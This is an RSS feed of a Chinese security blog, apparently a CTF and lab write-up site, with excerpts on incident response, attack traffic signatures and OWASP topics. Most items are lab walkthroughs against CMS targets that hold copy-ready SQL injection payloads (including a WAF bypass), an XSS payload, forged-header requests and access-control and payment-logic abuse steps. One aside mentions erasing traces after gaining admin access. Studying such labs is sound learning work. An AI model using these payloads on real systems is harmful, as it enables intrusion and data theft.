<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>Posts on write-up</title>
    <link>https://xxxhidexxx.github.io/posts/</link>
    <description>Recent content in Posts on write-up</description>
    <generator>Hugo -- gohugo.io</generator>
    <language>en-us</language>
    <copyright>null</copyright>
    <lastBuildDate>Sat, 18 May 2024 00:00:00 +0000</lastBuildDate>
    <atom:link href="https://xxxhidexxx.github.io/posts/index.xml" rel="self" type="application/rss+xml" />
    <item>
      <title>蓝队进阶攻略</title>
      <link>https://xxxhidexxx.github.io/posts/sec/hvv/</link>
      <pubDate>Sat, 18 May 2024 00:00:00 +0000</pubDate>
      <guid>https://xxxhidexxx.github.io/posts/sec/hvv/</guid>
      <description>应急类问题 应急问题的回答公式 先隔离出现问题的主机；判断影响范围；找到漏洞源头；清除攻击载荷；安全加固，修复漏洞；溯源分析；输出报告。&#xA;根据具体情况选择性填充细节。&#xA;你到客户现场进行安全加固都要做哪些事 检查弱口令和未授权访问；确定开启了日志的审计功能；检查防火墙策略，关闭不必要的端口；停止不必要的服务，修改不必要的权限；检查系统补丁；更新中间件版本。&#xA;ddos 的加固和处置 加固：部署负载均衡、多节点、cdn、集群；部署抗 ddos 设备、流量监控设备；关闭非必要端口。&#xA;处置：判断 ddos 的类型（网络层、传输层、应用层）；封禁异常访问的 ip；保留攻击期间的 ip 进行取证；调整安全设备的防护策略；联系运营商清洗流量。&#xA;发现网页篡改，你会怎么做 隔离被感染主机。&#xA;排查业务系统，判断影响范围。&#xA;确定漏洞源头。&#xA;修复漏洞，加固系统。&#xA;查找数据备份，恢复业务。&#xA;查询日志和设备告警记录进行溯源反制，建立攻击者画像。&#xA;输出报告。&#xA;已知 webshell 上传，你应该怎么做 首先对失陷的主机进行隔离，看情况可以断网。&#xA;然后确定 webshell 的位置和创建时间，可以用 D 盾、河马等工具，也可以自己查看日志文件。&#xA;清除 webshell 之后排查是否留有后门。&#xA;通过日志查看是否进行了危险操作。查看是否有新增用户。查看可疑的进程、服务、网络连接。&#xA;排查后门之后报告漏洞点，提供加固修复的建议。&#xA;通过日志进行溯源，建立攻击者画像。&#xA;整理工作，输出一份报告。&#xA;攻击者在外网，但是设备出现内网告警，怎么解释这种现象，怎么看到真实 ip 可能是安全设备误报，在安全设备采集数据的时候把一些 ip 转换成了内网 ip 导致告警显示的是内网，出现这种误报可能是安全设备在网络拓扑中的位置错了；可能是 ip 欺骗，例如 xff 请求头伪造；可能有 ssrf 漏洞可以访问内网；可能有失陷主机正在进行横向移动。&#xA;需要根据告警内容排查是否为误报。&#xA;可以通过 x-forwarded-for 看真实 ip，其中 xff 的几项分别为：真实 ip，代理 ip-1，代理 ip-2，&amp;hellip;&#xA;已知内网告警为真实威胁，你会怎么做 先判断是否为蜜罐。&#xA;根据告警信息定位出现问题的设备，路由器 arp 缓存表可以找内网 ip 对应的 mac 地址。</description>
    </item>
    <item>
      <title>基于 python 的无文件木马</title>
      <link>https://xxxhidexxx.github.io/posts/sec/python-trojan/</link>
      <pubDate>Thu, 18 Apr 2024 00:00:00 +0000</pubDate>
      <guid>https://xxxhidexxx.github.io/posts/sec/python-trojan/</guid>
      <description></description>
    </item>
    <item>
      <title>应急响应流程和网络安全基础</title>
      <link>https://xxxhidexxx.github.io/posts/sec/pdcerf/</link>
      <pubDate>Thu, 18 Apr 2024 00:00:00 +0000</pubDate>
      <guid>https://xxxhidexxx.github.io/posts/sec/pdcerf/</guid>
      <description>pdcerf：准备-检测-抑制-根除-恢复-总结。&#xA;准备 明确职责；梳理资产，梳理暴露面，关闭不必要的映射；检查弱口令和密码策略；更新漏洞补丁；确认资产开启了日志存储，可对日志进行监控、审计和溯源。&#xA;准备阶段首先要确定能够找到和打开日志文件。&#xA;https 加密原理，抓包工具怎么截获明文 https 报文 http/s 本身是加密通信的，我们在抓包工具里面看到的明文数据包，是抓包工具自动截获密钥之后解密的结果。&#xA;https 加密方式：先使用非对称加密传输 ssl 证书并建立连接，再使用对称加密传输数据。这里非对称加密意味着只有一方需要提供 ssl 证书。&#xA;http 不安全的原因：对称加密导致的中间人攻击，中间人查看和篡改请求包、响应包，或者跳转到恶意网站。&#xA;只使用非对称加密不可行的原因：传输效率太低了。&#xA;burpsuite 抓 https 明文的方法就是对自己进行一次中间人攻击，分别与浏览器和服务器建立 https 连接。能够对 https 报文进行加密解密，就叫建立 https 连接。&#xA;burp 先是截获了服务器给浏览器的公钥。然后在 burp 上生成公私钥，将 burp 的密钥发给浏览器。之前配置 burp 的时候浏览器已经导入了 burp 的证书，这样 burp 和浏览器建立了 https 连接，使用的是 burp 的密钥，所以 burp 可以解密看到明文的 https 请求。同理，burp 再与服务器建立 https 连接，可以看到明文 https 响应。&#xA;数据传输的过程中 burp 有两套对称加密的密钥，分别用来和浏览器/服务器进行加密通信。&#xA;其他工具例如 wireshark 也可以抓 https 明文，但是原理不同，wireshark 是先将浏览器 ssl 日志设置环境变量，再将 ssl 日志路径设置到 wireshark 里面，让 wireshark 读取 ssl，进行解密，整个过程只有一套密钥。</description>
    </item>
    <item>
      <title>攻击流量特征</title>
      <link>https://xxxhidexxx.github.io/posts/sec/char/</link>
      <pubDate>Thu, 18 Apr 2024 00:00:00 +0000</pubDate>
      <guid>https://xxxhidexxx.github.io/posts/sec/char/</guid>
      <description>传统漏洞的流量特征 sql&amp;amp;xss 请求包里面有明文 payload，攻击者会尝试很多次，很明显的特征。&#xA;rce 这里只说最基础的，看到内网 ip 和 net user，curl，more，less 等 windows/linux 系统命令，或者 eval，system 等函数，则判断是 rce 攻击流量。&#xA;文件包含 看到 require/include 等函数判断是文件包含攻击流量。&#xA;任意文件 看到 /etc/passwd 等敏感目录，判断是任意文件读取/下载/删除攻击流量。&#xA;看到上传文件的包里面有明文木马等恶意代码，判断是任意文件上传攻击流量。&#xA;java 反序列化漏洞的流量特征 主要考虑 struts2、shiro、weblogic、log4j2、fastjson 等组件及其历史漏洞的流量特征。&#xA;java 反序列化数据传输 16 进制编码以 ac ed 00 05 开头，base64 编码为 rO0AB。&#xA;有的 Content-Type: application/x-serialization 直接说明是 java 序列化数据包。&#xA;shiro shiro 的 cookie 存在反序列化注入点。&#xA;shiro 的流量特征是 cookie 有 rememberme 字段并使用 base64 编码。&#xA;shiro550 和 shiro721 攻击方法的区别：550 密码撞库，721 填充攻击。&#xA;如果 shiro cookie 正确，则返回包不会有 set-cookie: rememberme</description>
    </item>
    <item>
      <title>OWASP Top 10 选讲</title>
      <link>https://xxxhidexxx.github.io/posts/sec/top10/</link>
      <pubDate>Mon, 15 Apr 2024 00:00:00 +0000</pubDate>
      <guid>https://xxxhidexxx.github.io/posts/sec/top10/</guid>
      <description>这里对 OWASP 在 2013、2017、2021 年提出的十大常规漏洞的原理和防御进行选择性的总结。OWASP 是一个致力于网络安全的国际非盈利组织，OWASP Top 10 是定期更新的报告，概述了 Web 应用程序安全性的安全问题，重点关注 10 个最关键的风险。&#xA;ssrf 防御 ssrf （1）设置 url 白名单，限制内网 ip 的访问；&#xA;（2）禁用非常规协议和端口，例如禁用除 http/s 之外的协议、禁用除 80/443 之外的端口；&#xA;（3）统一报错信息，避免根据报错信息的不同判断内网 ip 端口的开放状态。&#xA;利用 ssrf （1）dict 协议泄露了软件版本；&#xA;（2）file 协议读取敏感文件；&#xA;（3）gopher 协议反弹 shell；&#xA;（4）http/s 协议扫描内网端口。&#xA;ssrf 出现的场景 凡是用户输入的 url 和服务器进行交互的地方都可能存在 ssrf。例如：（1）用 url 分享网页信息；（2）在线翻译/转码；（3）图片加载/下载；（4）图片/文章的收藏；（5）未授权访问的页面里面有 ssrf；（6）url 锚点包含 ssrf。&#xA;ssrf 绕过限制 ip rebind&#xA;sql 注入 sql 注入如何判断数据库类型 (1) 从语言习惯判断。&#xA;asp：SQL Server，Access&#xA;.net ：SQL Server&#xA;php：Mysql，PostgreSql&#xA;java：Oracle，Mysql&#xA;（2）从默认端口判断。&#xA;Mysql: 3306</description>
    </item>
    <item>
      <title>熊海 CMS v1.0 越权登录管理员账号</title>
      <link>https://xxxhidexxx.github.io/posts/sec/lo5/</link>
      <pubDate>Wed, 13 Mar 2024 00:00:00 +0000</pubDate>
      <guid>https://xxxhidexxx.github.io/posts/sec/lo5/</guid>
      <description>漏洞原理：我们添加一个用来占位的 cookie 保证 cookie 不为空，即可越权访问后台，并且可以避免跳转回登录页面。&#xA;这个靶场演示的是熊海 CMS v1.0 的越权漏洞。&#xA;尝试将 url 中的 ?r=login 改为 ?r=index 直接进后台，发现无效，会跳回登录页面。&#xA;开 burp 拦截，在 cookie 中添加 user，值可以任意输入，例如将 Cookie: PHPSESSID=b58boijgnqf8hcg1f62rgb94c3 改为 Cookie: PHPSESSID=b58boijgnqf8hcg1f62rgb94c3；user=123 同时将 url 参数改为 ?r=index。发现直接进入管理员后台。&#xA;我们刚才是用 burp 抓包修改 cookie，这个 cookie 没有保存，无法真正进入后台页面，随便点一个按钮就跳转回登录页面。因此我们用 cookie-editor 插件添加一个 user 并保存。就可以直接输入 url 越权访问管理员后台，也可以修改管理员账号密码。&#xA;得到 flag=ywaq{xionghai-czyq}。（其实这个 flag 首页点评论就能看到，不需要操作。）</description>
    </item>
    <item>
      <title>MetInfo v4.0 越权修改密码</title>
      <link>https://xxxhidexxx.github.io/posts/sec/lo4/</link>
      <pubDate>Tue, 12 Mar 2024 00:00:00 +0000</pubDate>
      <guid>https://xxxhidexxx.github.io/posts/sec/lo4/</guid>
      <description>这个靶场演示的是 MetInfo v4.0 的 nday。&#xA;先注册一个账号，找到修改密码，然后抓包。&#xA;将 userid 改为任意用户，密码自己设置。&#xA;用其他人的用户名和自己设置的密码，成功登录到其他人的账号。&#xA;进入个人中心找到 flag=ywaq{uhgJHzxdIG}。</description>
    </item>
    <item>
      <title>vl CMS 无密码登录</title>
      <link>https://xxxhidexxx.github.io/posts/sec/lo3/</link>
      <pubDate>Mon, 11 Mar 2024 00:00:00 +0000</pubDate>
      <guid>https://xxxhidexxx.github.io/posts/sec/lo3/</guid>
      <description>打开靶场页面如下。&#xA;利用 nday 已知信息，将 url 修改为 index.php?s=/member/res_login/ 并抓包。&#xA;将 GET 改为 POST 并在结尾加上 id=1。&#xA;回到主页刷新，发现已经登录到其他人的账号。&#xA;进入个人中心得到 flag=ywaq{uhgzxdygfh}。&#xA;添加 &amp;amp;id=1 是常用绕过手法。</description>
    </item>
    <item>
      <title>easy CMS 支付逻辑漏洞</title>
      <link>https://xxxhidexxx.github.io/posts/sec/lo2/</link>
      <pubDate>Sun, 10 Mar 2024 00:00:00 +0000</pubDate>
      <guid>https://xxxhidexxx.github.io/posts/sec/lo2/</guid>
      <description>我们打开这个 easyCMS 的靶场，为了测试支付逻辑，先随便注册一个账户并登录。&#xA;打开购买商品的页面，尝试修改数量为负，发现有前端拦截。&#xA;开 burp 过前端拦截，抓到修改数量的包，将数量改为 -1，发现购买成功。&#xA;查看订单，得到 flag=ywag{ijhzxdJHGt}。</description>
    </item>
    <item>
      <title>大米 CMS 支付逻辑漏洞</title>
      <link>https://xxxhidexxx.github.io/posts/sec/lo1/</link>
      <pubDate>Sun, 10 Mar 2024 00:00:00 +0000</pubDate>
      <guid>https://xxxhidexxx.github.io/posts/sec/lo1/</guid>
      <description>打开大米 CMS 的靶场，找到支付页面。提示必须登录才可以继续下一步，我们随便注册一个账户即可。&#xA;首先发现这个数量可以直接修改成 -1，但是提交无效。&#xA;我们还是用正常的购买流程，开 burp 拦截。修改参数 qty=-1，代表数量变为 -1，提交之后购买成功。&#xA;可以看出这里直接将前端传递的参数作为金额和账户余额进行结算。因此我们将订单的产品数量修改为负数可以实现账户充值。&#xA;订单页面看到了 flag=ywaq{zxdijGcztU}。</description>
    </item>
    <item>
      <title>Yzm CMS 存在反射型 XSS</title>
      <link>https://xxxhidexxx.github.io/posts/sec/xss1/</link>
      <pubDate>Sat, 09 Mar 2024 00:00:00 +0000</pubDate>
      <guid>https://xxxhidexxx.github.io/posts/sec/xss1/</guid>
      <description>YzmCMS 主页面的搜索功能有三个参数，这三个参数都存在反射性 xss。&#xA;没有过滤，我们插入常规 payload 即可。&#xA;&amp;lt;img src=a onerror=alert(1)&amp;gt;&#xD;</description>
    </item>
    <item>
      <title>SQL 注入绕 WAF</title>
      <link>https://xxxhidexxx.github.io/posts/sec/sqli9/</link>
      <pubDate>Wed, 06 Mar 2024 00:00:00 +0000</pubDate>
      <guid>https://xxxhidexxx.github.io/posts/sec/sqli9/</guid>
      <description>这个靶场演示的是最新版安全狗。&#xA;我们输入单引号，and，等号之类的字符都会被拦截。&#xA;利用内联注释构造如下 payload，即可成功绕过这个拦截。&#xA;?id=1/*!50001-- qwe/*%0Aand 1=1*/&#xD;其中 /*!50001 something */ 是 mysql 的内联注释，意思是当版本大于等于 5.00.01 则执行注释内语句。&#xA;&amp;ndash; qwe 注释了 / * 因为 &amp;ndash; qwe 是单行注释，因此当遇到 %0a 换行时就不会再接着注释了。其中因为 1=1 写在/ * * /里面，WAF认为他是一个注释，所以不会管，但其实我们已经注释了，而这个 / * 结尾的 * / 是闭合开始时的 / * !&#xA;随后提取 flag 即可，此处从略。&#xA;?id=1/*!50001-- qwe/*%0Aand 1=2 union select 1,1,schema_name from information_schema.schemata limit 0,1*/&#xD;</description>
    </item>
    <item>
      <title>中环 CMS 主页面存在 SQL 注入</title>
      <link>https://xxxhidexxx.github.io/posts/sec/sqli7/</link>
      <pubDate>Mon, 19 Feb 2024 00:00:00 +0000</pubDate>
      <guid>https://xxxhidexxx.github.io/posts/sec/sqli7/</guid>
      <description>注入点 第一次见到这种注入点。我们在搜索框输入 t 然后抓包，这是为了保证返回的搜索内容不为空。&#xA;发现 sertype 变量在加入恒真恒伪后提供了一个布尔盲注点位。&#xA;POST /index.php/index/search HTTP/1.1&#xD;Host: 111.9.41.91:53009&#xD;User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:122.0) Gecko/20100101 Firefox/122.0&#xD;Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8&#xD;Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2&#xD;Accept-Encoding: gzip, deflate, br&#xD;Content-Type: application/x-www-form-urlencoded&#xD;Content-Length: 140&#xD;Origin: http://111.9.41.91:53009&#xD;Connection: close&#xD;Referer: http://111.9.41.91:53009/index.php/index/search&#xD;Cookie: admin=admin; pass=21232f297a57a5a743894a0e4a801fc3; PHPSESSID=0gficahl2rfqurrer05uhkdv96&#xD;Upgrade-Insecure-Requests: 1&#xD;sertype=1 and 1=2;#&amp;amp;search=t&amp;amp;sub=%E6%90%9C%E7%B4%A2&#xD;爆破 开 burp 爆破。&#xA;构造如下 payload。&#xA;1 and ascii(substr((select schema_name from information_schema.schemata limit 0,1),1,1))=100;# 1 and ascii(substr((select table_name from information_schema.tables where table_schema=&#39;flag_db&#39; limit 0,1),1,1))=1;# 1 and ascii(substr((select column_name from information_schema.</description>
    </item>
    <item>
      <title>禅道 PMS 用户登录存在 SQL 注入</title>
      <link>https://xxxhidexxx.github.io/posts/sec/sqli6/</link>
      <pubDate>Mon, 19 Feb 2024 00:00:00 +0000</pubDate>
      <guid>https://xxxhidexxx.github.io/posts/sec/sqli6/</guid>
      <description>语法报错 下述 payload 可以直接复制使用。&#xA;extractvalue() 1&#39; and extractvalue(1,concat(0x5c,0x7e,(select schema_name from information_schema.schemata limit 0,1),0x7e)) and &#39;1&#39;=&#39;1&#xD;updatexml() 1&#39; and updatexml(1,concat(0x5c,0x7e,(select schema_name from information_schema.schemata limit 0,1),0x7e),1) and &#39;1&#39;=&#39;1&#xD;floor() 1&#39; and (select 1 from (select count(*),concat((select schema_name from information_schema.schemata limit 0,1),0x2b,floor(rand(0)*2))x from information_schema.tables group by x)a) and &#39;1&#39;=&#39;1&#xD;攻击流程 打开靶场看到如下页面。在输入随机用户名密码之后会出现弹窗，告诉我们密码有误。但是输入单引号之后，页面没有任何变化。没有出现弹窗说明单引号起作用了，这提示我们存在 sql 注入点。我们用 burp 抓包发现虽然浏览器里面的页面没有显示报错，但是 burp 里面可以看到语法报错。后面走走流程就可以拿到 flag。&#xA;构造如下 payload。&#xA;1&#39; and extractvalue(1,concat(0x5c,0x7e,(select schema_name from information_schema.schemata limit 0,1),0x7e)) and &#39;1&#39;=&#39;1&#xD;1&#39; and extractvalue(1,concat(0x5c,0x7e,(select table_name from information_schema.</description>
    </item>
    <item>
      <title>Blue CMS v1.6 留言区存在 XFF 伪造漏洞</title>
      <link>https://xxxhidexxx.github.io/posts/sec/sqli5/</link>
      <pubDate>Thu, 15 Feb 2024 00:00:00 +0000</pubDate>
      <guid>https://xxxhidexxx.github.io/posts/sec/sqli5/</guid>
      <description>概述 这是个靶场，提示 header 注入。打开网页的留言区发现了留言显示 ip 地址，因此想到伪造 X-FORWARDED-FOR。最终我们在留言区将留言作为回显拿到了 flag。&#xA;找到注入点 打开靶场后看到如下界面。&#xA;发现可以用弱口令登录管理员后台。&#xA;如果是真实场景我们可以考虑尝试在后台挖别的漏洞，但是考虑到靶场提示 flag 用到 http-header 做 sql 注入，我们考虑先回原来的网站尝试寻找能显示 ip 的地方。&#xA;（事后发现登录管理员权限也是有意义的，主要是在拿到 flag 之后删除痕迹，逃离肇事现场。）&#xA;回到原来的页面，找到留言区，发现提交留言会显示 ip 地址。我们用 burp 抓包后在请求里面人为添加一行 xff 进行伪造。&#xA;POST /guest_book.php HTTP/1.1&#xD;Host: 111.9.41.91:53005&#xD;User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:122.0) Gecko/20100101 Firefox/122.0&#xD;X-FORWARDED-FOR: &#39;&#xD;Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8&#xD;Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2&#xD;Accept-Encoding: gzip, deflate, br&#xD;Content-Type: application/x-www-form-urlencoded&#xD;Content-Length: 36&#xD;Origin: http://111.9.41.91:53005&#xD;Connection: close&#xD;Referer: http://111.9.41.91:53005/guest_book.php&#xD;Cookie: __tins__713776=%7B%22sid%22%3A%201708012726639%2C%20%22vd%22%3A%201%2C%20%22expires%22%3A%201708014526639%7D; __51cke__=; __51laig__=1; PHPSESSID=eigkieftqj4bb7qg3frjdtav35; admin=admin; pass=21232f297a57a5a743894a0e4a801fc3; detail=1&#xD;Upgrade-Insecure-Requests: 1&#xD;content=test&amp;amp;act=send&amp;amp;rid=&amp;amp;page_id=1&#xD;我们在 xff 处分别写单引号和 0.</description>
    </item>
    <item>
      <title>熊海 CMS v1.0 后台登录存在 SQL 注入</title>
      <link>https://xxxhidexxx.github.io/posts/sec/sqli4/</link>
      <pubDate>Mon, 12 Feb 2024 00:00:00 +0000</pubDate>
      <guid>https://xxxhidexxx.github.io/posts/sec/sqli4/</guid>
      <description>这是一个基于熊海 cms 的靶场，并且提示我们存在 post 注入。打开 burp 抓个包，用 burp 目标里面的目录扫描找到了后台 /admin，打开得到管理员登录界面。&#xA;有必要说的是，这个登录页面是个弱口令，但是急于用弱口令登录进去就会错过外面这个登录页面的漏洞。&#xA;最终我们发现这个登录页面存在 sql 注入，可以在不登录的情况下借助外带的语法报错拿到数据库信息。&#xA;语法回顾 我们使用 extractvalue() 和 concat() 这两个函数引起报错。&#xA;extractvalue(xml_frag,xpath_expr) 是 mysql 的 xml 函数，有两个字符串参数，我们写 extractvalue(1,concat(&amp;hellip;)) 就可以了。concat() 就是拼接字符串，我们写一个 0x5c 或者 0x7e 就会引起路径错误，payload 如下。&#xA;1&#39; and extractvalue(1,concat(&#xD;0x5c,&#xD;0x7e,&#xD;(select value from flag_db.flag limit 0,1),&#xD;0x7e&#xD;)) and &#39;1&#39;=&#39;1&#xD;同样是 xml 函数的 updatexml() 可以替代 extractvalue()，payload 如下。&#xA;1&#39; and updatexml(1,concat(&#xD;0x5c,&#xD;0x7e,&#xD;(select value from flag_db.flag limit 0,1),&#xD;0x7e&#xD;),1) and &#39;1&#39;=&#39;1&#xD;在这两个 xml 函数用不了的时候用 floor() 报错也可以，但是写起来会比较麻烦，payload 如下。</description>
    </item>
    <item>
      <title>Kali Linux 网络设置</title>
      <link>https://xxxhidexxx.github.io/posts/sec/kalinetwork/</link>
      <pubDate>Sat, 10 Feb 2024 00:00:00 +0000</pubDate>
      <guid>https://xxxhidexxx.github.io/posts/sec/kalinetwork/</guid>
      <description>连不上网的时候可以用如下指令。&#xA;dhclient -v&#xD;代理走本机的话可以用本机开 clash。&#xA;创建脚本。&#xA;#!/bin/bash&#xD;# encoding: utf-8&#xD;Proxy_IP=192.168.1.1&#xD;Proxy_Port=8080&#xD;# Set System Proxy&#xD;function xyon(){&#xD;export https_proxy=http://$Proxy_IP:$Proxy_Port&#xD;export http_proxy=http://$Proxy_IP:$Proxy_Port&#xD;export all_proxy=socks5://$Proxy_IP:$Proxy_Port&#xD;echo -e &amp;quot;System Proxy is $Proxy_IP:$Proxy_Port&amp;quot;&#xD;}&#xD;# unSet System Proxy&#xD;function xyoff(){&#xD;unset all_proxy&#xD;unset https_proxy&#xD;unset http_proxy&#xD;echo -e &amp;quot;System Proxy is Disabled&amp;quot;&#xD;}&#xD;# Default Function is Set Proxy&#xD;if [ $# != 0 ]&#xD;then&#xD;if [ $1 == &#39;off&#39; ]&#xD;then&#xD;xyoff&#xD;elif [ $1 == &#39;on&#39; ]&#xD;then&#xD;xyon&#xD;else&#xD;echo &amp;quot;Please Input on or off!</description>
    </item>
    <item>
      <title>Oracle 联合注入</title>
      <link>https://xxxhidexxx.github.io/posts/sec/sqli2/</link>
      <pubDate>Fri, 02 Feb 2024 00:00:00 +0000</pubDate>
      <guid>https://xxxhidexxx.github.io/posts/sec/sqli2/</guid>
      <description>靶场界面如下。&#xA;我们先确认一下参数 id 处存在注入点。&#xA;http://111.9.41.91:53109/?id=1&#39; or &#39;1&#39;=&#39;1&#xD;当输入 order by 6 时报错，而 order by 5 不报错，确认字段数为 5。&#xA;http://111.9.41.91:53109/?id=1&#39; order by 6 --+&#xD;我们现在就可以用联合查询进行注入了。这里需要注意 oracle 的语法，from dual 是占位置用的，因为 oracle 的语句必须包含表名；我们使用 null 而不是 12345 是因为数据类型未知。&#xA;先确认一下没有报错。&#xA;http://111.9.41.91:53109/?id=1&#39; union select null,null,null,null,null from dual --+&#xD;然后确认回显点的数据类型，我们只需要一个回显点就够了。&#xA;http://111.9.41.91:53109/?id=1&#39; union select 1,&#39;a&#39;,null,null,null from dual --+&#xD;现在我们使用 oracle 的自带库。&#xA;http://111.9.41.91:53109/?id=1&#39; union select 1,table_name,null,null,null from user_all_tables --+&#xD;我们找到了 flag 的表，进一步查询字段。&#xA;http://111.9.41.91:53109/?id=1&#39; union select 1,column_name,null,null,null from all_tab_columns where table_name=&#39;UNION_FLAG&#39; --+&#xD;至此我们就找到了 flag。</description>
    </item>
    <item>
      <title>MySQL 联合注入</title>
      <link>https://xxxhidexxx.github.io/posts/sec/sqli1/</link>
      <pubDate>Thu, 01 Feb 2024 00:00:00 +0000</pubDate>
      <guid>https://xxxhidexxx.github.io/posts/sec/sqli1/</guid>
      <description>对 mysql 进行联合注入是在有回显点的情况下用 union select 直接查询数据库内容，查询结果在回显点用 group_concat 输出。常见的关系型数据库都有系统自带库，mysql 的是 information_schema 这个库，其中存储着全部库名、表名、字段名。我们这里要做的是在 information_schema 找到关键的库、表、字段，从而找到 flag。&#xA;webug 4.0 的联合注入靶场界面如下。&#xA;首先在 id 参数之后加单引号进行尝试。&#xA;出现报错说明有注入点，这里甚至直接看到了 sql 语句。我们用 order by 猜测字段数，order by 2 正常，到 3 之后出现报错，说明有两个字段。&#xA;用联合查询查找回显点。&#xA;出现了一个回显点。那么我们可以直接爆出所有的库名和表名了。构造如下 poc&#xA;?id=-1&#39; union select null，group_concat(schema_name) from information_schema.schemata --+&#xD;可以看到如下显示。&#xA;至此这个靶场的 flag 就拿到了。</description>
    </item>
  </channel>
</rss>
